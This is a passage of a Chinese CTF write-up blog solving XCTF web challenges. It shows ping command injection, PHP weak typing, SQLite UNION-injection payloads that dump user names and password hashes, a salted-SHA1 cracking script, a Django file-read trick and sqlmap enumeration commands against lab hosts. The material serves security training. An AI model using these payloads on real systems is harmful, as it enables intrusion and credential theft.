src="https://s2.ax1x.com/2019/12/30/lMPmCV.png" alt="lMPmCV.png"></p><p>选择双击：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPJ4x.png" alt="lMPJ4x.png"></p><p>看到flag.txt,打开：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMPN8K.png" alt="lMPN8K.png"></p><hr><h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><h2 id="题目描述：-9"><a href="#题目描述：-9" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><h2 id="知识补充：-5"><a href="#知识补充：-5" class="headerlink" title="知识补充："></a>知识补充：</h2><h3 id="1、ping-（网络诊断工具）"><a href="#1、ping-（网络诊断工具）" class="headerlink" title="1、ping （网络诊断工具）"></a>1、ping （网络诊断工具）</h3><p>Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。<br>应用格式：ping空格IP地址。<em>该命令还可以加许多参数使用，具体是键入ping按回车即可看到详细说明。</em><br>作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：<strong>利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。</strong><br>ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。</p><h3 id="2、有关命令执行的知识"><a href="#2、有关命令执行的知识" class="headerlink" title="2、有关命令执行的知识"></a>2、有关命令执行的知识</h3><p>windows或linux下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp; command2 ：先执行command2后执行command1</span><br><span class="line">command1 &amp;&amp; command2 ：先执行command1后执行command2</span><br><span class="line">command1 | command2 ：只执行command2</span><br><span class="line">command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</span><br></pre></td></tr></table></figure><h3 id="3、WAF"><a href="#3、WAF" class="headerlink" title="3、WAF"></a>3、WAF</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>Web应用防火墙会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。<br>（<a href="https://www.waitalone.cn/waf-bypass-methods-and-reflection.html" target="_blank" rel="noopener">WAF绕过</a>）此题给出未开WAF，所以不用考虑这一步。</p><h3 id="4、还需要掌握一些常用的命令"><a href="#4、还需要掌握一些常用的命令" class="headerlink" title="4、还需要掌握一些常用的命令"></a>4、还需要掌握一些常用的命令</h3><p>ls 对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。<br>Cd 改变工作目录，将当前工作目录改变到指定的目录下。<br>cat是打印文件内容<br>tac 是反向打印<br>less 文件名：分页显示文件内容（如less /etc/passwd）<br>Find 沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应操作。<br>关于find可以参考：<a href="https://www.jianshu.com/p/16af649d9b6d" target="_blank" rel="noopener">https://www.jianshu.com/p/16af649d9b6d</a><br>*&lt;利用截断来执行行的命令，如’$’ 和 ‘ ; ‘和 ‘|’ 和 ‘-‘ 和 ‘(‘ 和 ‘ ) ‘ 和 ‘ “ ‘ 和 ‘||’ 和’&amp;&amp;’ 和 ‘&amp;’ 和 ‘{‘ 和 ‘}’等&gt;*</p><h2 id="实际操作：-6"><a href="#实际操作：-6" class="headerlink" title="实际操作："></a>实际操作：</h2><p><img src="https://s2.ax1x.com/2019/12/30/lMMoXn.png" alt="lMMoXn.png"></p><p><img src="https://s2.ax1x.com/2019/12/30/lMdmvV.png" alt="lMdmvV.png"></p><p>试着使用命令连接符，查看目录</p><p><img src="https://s2.ax1x.com/2019/12/30/lMdGCR.png" alt="lMdGCR.png"></p><p><img src="https://s2.ax1x.com/2019/12/30/lMdJ81.png" alt="lMdJ81.png"></p><p>发现有home目录，看看里面有啥：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMdYgx.png" alt="lMdYgx.png"></p><p>发现有flag.txt;或者直接根据文件名或正则表达式进行搜索，如下：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMdlE4.png" alt="lMdlE4.png"></p><p>得到flag.txt在home下，cat一下：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMdMbF.png" alt="lMdMbF.png"></p><p>同时这道题，查看代码可以发现：POST传参是通过参数target，而target就是我们所要输入的值</p><p><img src="https://s2.ax1x.com/2019/12/30/lMdKDU.png" alt="lMdKDU.png"></p><p>尝试post传值：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMM7mq.png" alt="lMM7mq.png"></p><p>得到flag:</p><p><img src="https://s2.ax1x.com/2019/12/30/lMMI6s.png" alt="lMMI6s.png"></p><p><img src="https://s2.ax1x.com/2019/12/30/lMM5lj.png" alt="lMM5lj.png"></p><hr><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><h2 id="题目描述：-10"><a href="#题目描述：-10" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p><h2 id="实际操作：-7"><a href="#实际操作：-7" class="headerlink" title="实际操作："></a>实际操作：</h2><p>打开链接：<br><img src="https://s2.ax1x.com/2019/12/30/lMMb7V.png" alt="lMMb7V.png"></p><p>很简单的PHP代码：a要等于0，又不能等于0；b不能是数字，但还要大于1234</p><p><strong><em>is_numeric（）来函数用于检测变量是否为数字或数字字符串。</em></strong><br><strong><em>如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE。</em></strong></p><p>此处靠php弱类型比较：可查看我的这篇博文<br>构造如下url:</p><p><img src="https://s2.ax1x.com/2019/12/30/lMM4pQ.png" alt="lMM4pQ.png"></p><hr><hr><h1 id="高手进阶区"><a href="#高手进阶区" class="headerlink" title="高手进阶区"></a>高手进阶区</h1><h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><h2 id="题目提示："><a href="#题目提示：" class="headerlink" title="题目提示："></a>题目提示：</h2><p>想想初始页面是哪个</p><h2 id="实际操作：-8"><a href="#实际操作：-8" class="headerlink" title="实际操作："></a>实际操作：</h2><p>考虑到可能是页面302重定向<br>抓包得到flag</p><p><img src="https://s2.ax1x.com/2019/12/18/QTyYIe.png" alt="QTyYIe.png"></p><hr><h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h1><h2 id="实际操作-2"><a href="#实际操作-2" class="headerlink" title="实际操作"></a>实际操作</h2><p>点进去有好多链接，下载PDF，跳回等；<br>  查看robots.txt(<a href="https://baike.baidu.com/item/robots协议/2483797?fromtitle=robots.txt&fromid=9518761&fr=aladdin" target="_blank" rel="noopener">robots.txt</a>:是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。)<br>访问:<a href="http://111.198.29.45:34978/robots.txt" target="_blank" rel="noopener">http://111.198.29.45:34978/robots.txt</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /login.php</span><br><span class="line"><span class="string">Disallow:</span> /admin.php</span><br></pre></td></tr></table></figure><p>访问login.php:<br>得到了一个登陆页面，尝试sqli,<br>提示：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Warning</span>: SQLite3::query(): Unable <span class="keyword">to</span> <span class="keyword">prepare</span> <span class="keyword">statement</span>: <span class="number">1</span>, unrecognized token: "2801497d9ca18eef4382b18d1889b8bc97e28461" <span class="keyword">in</span> /var/www/html/<span class="keyword">login</span>.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">47</span></span><br><span class="line"><span class="keyword">Some</span> Error occourred!</span><br></pre></td></tr></table></figure><p>可以看到使用的是SQLite数据库,还有加密操作？</p><p>访问网页源码：</p><p><img src="https://s2.ax1x.com/2019/12/18/QTfmmn.png" alt="QTfmmn.png"></p><p>有参数提示debug;<br>尝试访问login.php?debug<br>得到如下php代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $user = $_POST[<span class="string">'usr'</span>];</span></span><br><span class="line"><span class="php">        $pass = $_POST[<span class="string">'pw'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($res)&#123;</span></span><br><span class="line"><span class="php">        $row = $res-&gt;fetchArray();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span></span><br><span class="line"><span class="php">            header(<span class="string">"Location: /"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'login.php'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到SQL的查询语句，并且对密码进行了加密操作(sha1+salt&lt;=（alz！）);<br>页面注入不成，抓包分析下：<br>构造：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr='union <span class="keyword">select</span> <span class="keyword">name</span>,<span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master<span class="comment">--+n&amp;pw=233</span></span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="https://s2.ax1x.com/2019/12/18/QTh5Ux.png" alt="QTh5Ux.png"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:<span class="built_in"> name</span>=+CREATE+TABLE+Users<span class="meta">%28id</span>+int+primary<span class="built_in">+key</span><span class="meta">%2Cname</span>+varchar<span class="meta">%28255</span><span class="meta">%29</span><span class="meta">%2Cpassword</span>+varchar<span class="meta">%28255</span><span class="meta">%29</span><span class="meta">%2Chint</span>+varchar<span class="meta">%28255</span><span class="meta">%29</span><span class="meta">%29</span>;</span><br></pre></td></tr></table></figure><p>URL编码转换一下：%27=&gt;’;%28=&gt;(;%29=&gt;);</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),hint <span class="built_in">varchar</span>(<span class="number">255</span>))</span><br></pre></td></tr></table></figure><p>看到Users表、id,name,password.hint字段；<br>构造查询语句：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,id from Users limit 0,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span>union select id,id <span class="keyword">from</span><span class="built_in"> Users </span>limit 1,1--&amp;<span class="attribute">pw</span>=233</span><br><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,id from Users limit 2,1--&amp;pw=233</span></span><br><span class="line"><span class="string">得到3个id；</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usr='union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">usr=<span class="string">'union select id,name from Users limit 1,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">得到<span class="keyword">name</span>：<span class="keyword">admin</span>、fritze、hansi</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/18/Q7946H.png" alt="Q7946H.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,password from Users limit 0,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span>union select id,password <span class="keyword">from</span><span class="built_in"> Users </span>limit 1,1--&amp;<span class="attribute">pw</span>=233</span><br><span class="line"><span class="attribute">usr</span>=<span class="string">'union select id,password from Users limit 2,1--&amp;pw=233</span></span><br><span class="line"><span class="string">得到password：</span></span><br><span class="line"><span class="string">3fab54a50e770d830c0416df817567662a9dc85c</span></span><br><span class="line"><span class="string">54eae8935c90f467427f05e4ece82cf569f89507</span></span><br><span class="line"><span class="string">34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usr='union <span class="keyword">select</span> <span class="keyword">id</span>,hint <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">usr=<span class="string">'union select id,hint from Users limit 1,1--&amp;pw=233</span></span><br><span class="line"><span class="string">usr='</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">id</span>,hint <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span><span class="comment">--&amp;pw=233</span></span><br><span class="line">得到hint：</span><br><span class="line">my+fav+word+<span class="keyword">in</span>+my+fav+paper%<span class="number">3</span>F%<span class="number">21</span></span><br><span class="line">my+love+<span class="keyword">is</span>%E2%<span class="number">80</span>%A6%<span class="number">3</span>F</span><br><span class="line">the+<span class="keyword">password</span>+<span class="keyword">is</span>+<span class="keyword">password</span></span><br></pre></td></tr></table></figure><p>根据admin用户的提示my fav word in my fav paper？！<br>应该是：密码+”Salz!”做sha1处理，密码应该就产生于pdf中；</p><p>因为我门知道了加密结果直接解密去掉Salz就得到密码了：</p><p><img src="https://s2.ax1x.com/2019/12/18/Q79onA.png" alt="Q79onA.png"><br><a href="https://www.somd5.com/" target="_blank" rel="noopener">解密</a></p><p>也可以用pdf中的单词进行+Salz!再做sha1；</p><p>借用一下别人的Python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br></pre></td></tr></table></figure><hr><h2 id="知识补充-2"><a href="#知识补充-2" class="headerlink" title="知识补充"></a>知识补充</h2><p>‘’’<br>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。<br>它不包括 . 和 .. 即使它在文件夹中。只支持在 Unix, Windows 下使用。<br>语法<br>listdir()方法语法格式如下：os.listdir(path)<br>参数:path – 需要列出的目录路径<br>返回值:返回指定路径下的文件和文件夹列表。<br>‘’’<br>‘’’<br>endswith() 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。<br>‘’’<br>‘’’<br>hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等。<br>其中<br>hash.digest()<br>返回摘要，作为二进制数据字符串值<br>hash.hexdigest()<br>返回摘要，作为十六进制数据字符串值<br>‘’’</p><hr><p>得到密码：ThinJerboa<br>访问：admin.php</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=admin</span><br><span class="line"><span class="attr">password</span>=ThinJerboa</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.ax1x.com/2019/12/18/Q795Xd.png" alt="Q795Xd.png"></p><hr><h1 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h1><h2 id="题目描述：-11"><a href="#题目描述：-11" class="headerlink" title="题目描述："></a>题目描述：</h2><p>仅给出了这样一个页面：</p><p><img src="https://s2.ax1x.com/2019/12/10/Q0bsJK.png" alt="Q0bsJK.png"></p><h2 id="实际操作：-9"><a href="#实际操作：-9" class="headerlink" title="实际操作："></a>实际操作：</h2><p>输入cat，得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PING cat.ad-world-<span class="number">198302431</span>-<span class="number">4658</span>.rancher.internal (<span class="number">10.42</span>.197.21) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line"><span class="number">64</span> <span class="function">bytes from <span class="title">b4fccc7cf554</span> <span class="params">(<span class="number">10.42</span><span class="number">.197</span><span class="number">.21</span>)</span>: icmp_seq</span>=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.045</span> ms</span><br><span class="line"></span><br><span class="line">--- cat.ad-world-<span class="number">198302431</span>-<span class="number">4658</span>.rancher.internal ping statistics ---</span><br><span class="line"><span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, time <span class="number">0</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.045</span>/<span class="number">0.045</span>/<span class="number">0.045</span>/<span class="number">0.000</span> ms</span><br></pre></td></tr></table></figure><p>并在URL中如此传参：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.198.29.45:35113/index.php?url=cat</span></span><br></pre></td></tr></table></figure><p>输入127.0.0.1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PING <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.061</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> ping statistics ---</span><br><span class="line"><span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, time <span class="number">0</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.061</span>/<span class="number">0.061</span>/<span class="number">0.061</span>/<span class="number">0.000</span> ms</span><br></pre></td></tr></table></figure><p>尝试使用命令连接符/管道命令，均被屏蔽；<br>目前仅知道，输入框通过用户输入进行<del>GET方式传参</del>；(此处请跳转文末 orz)<br>那么只能从url入手了，看看有没有可能爆出一些有用的信息；<br>测试发现超过ASCll可打印字符之外的url编码都会报错，比如键入<a href="http://111.198.29.45:35113/index.php?url=%8c" target="_blank" rel="noopener">http://111.198.29.45:35113/index.php?url=%8c</a> ：</p><p>给出报错信息：<br><img src="https://s2.ax1x.com/2019/12/10/Q0b6zD.png" alt="Q0b6zD.png"></p><p>可以明显看到使用的是Django框架；</p><p>查看配置文件信息：<a href="https://www.shiyanlou.com/questions/23602/" target="_blank" rel="noopener">settings.py</a></p><p><img src="https://s2.ax1x.com/2019/12/10/Q0bYzF.png" alt="Q0bYzF.png"></p><p>在报错信息中搜索database，发现的到有关数据库内容：</p><p><img src="https://s2.ax1x.com/2019/12/10/Q0bNM4.png" alt="Q0bNM4.png"></p><p>参考：<img src="https://s2.ax1x.com/2019/12/10/Q0bUsJ.png" alt="Q0bUsJ.png"></p><p>通过<a href="http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3" target="_blank" rel="noopener">http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3</a> 得到数据库内容：<br>查找ctf关键字：</p><p><img src="https://s2.ax1x.com/2019/12/10/Q0bGGT.png" alt="Q0bGGT.png"></p><p><del>源码里就是GET啊，那这个又是啥？？？post?！</del><br>orz  orz  orz</p><p><img src="https://s2.ax1x.com/2019/12/10/Q0b8iV.png" alt="Q0b8iV.png"></p><hr><h1 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h1><h2 id="问题分析："><a href="#问题分析：" class="headerlink" title="问题分析："></a>问题分析：</h2><p>  本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdHOVP.png" alt="QdHOVP.png"></p><p>尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞；</p><ul><li>构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://111.198.29.45:33931/findpwd.php"</span> <span class="params">--data=</span><span class="string">"username=1"</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure></li></ul><p>得到库名结果；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdHXUf.png" alt="QdHXUf.png"><br>库名</p><ul><li>对每个数据库进行表名猜解；<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u  <span class="string">"http://111.198.29.45:33931/findpwd.php"</span> <span class="params">--data=</span><span class="string">"username=1"</span> -D cetc004 <span class="params">--tables</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.ax1x.com/2019/12/09/QdH5CD.png" alt="QdH5CD.png"></p><ul><li>对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u  <span class="string">"http://111.198.29.45:33931/findpwd.php"</span> <span class="attribute">--data</span>=<span class="string">"username=1"</span> -D cetc004 -T<span class="built_in"> user </span>--columns</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.ax1x.com/2019/12/09/QdHHKA.png" alt="QdHHKA.png"></p><ul><li><p>对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span 